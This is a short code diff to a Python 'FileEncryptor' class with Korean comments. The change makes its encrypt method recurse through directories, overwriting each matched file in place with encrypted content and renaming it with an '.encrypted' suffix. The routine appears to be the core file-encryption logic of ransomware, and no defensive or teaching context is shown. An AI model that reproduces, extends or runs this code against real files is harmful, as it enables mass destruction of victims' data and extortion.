@@ -9,11 +9,14 @@ class FileEncryptor:
     def encrypt(self, target):
         file_list = glob.glob(target)
         for file in file_list:
-            with open(file, 'rb') as f:
-                encrypted_file = self.encryptor.encrypt(f.read())
+            if os.path.isdir(file):
+                self.encrypt(file+'/*')
+            else:
+                with open(file, 'rb') as f:
+                    encrypted_file = self.encryptor.encrypt(f.read())
 
-            with open(file, 'wb') as f:
-                f.write(encrypted_file) # 파일 암호화
+                with open(file, 'wb') as f:
+                    f.write(encrypted_file) # 파일 암호화
 
-            new_name = file + ".encrypted"
-            os.rename(file, new_name) # 파일의 이름 뒤에 .encrypted 추가
+                new_name = file + ".encrypted"
+                os.rename(file, new_name) # 파일의 이름 뒤에 .encrypted 추가
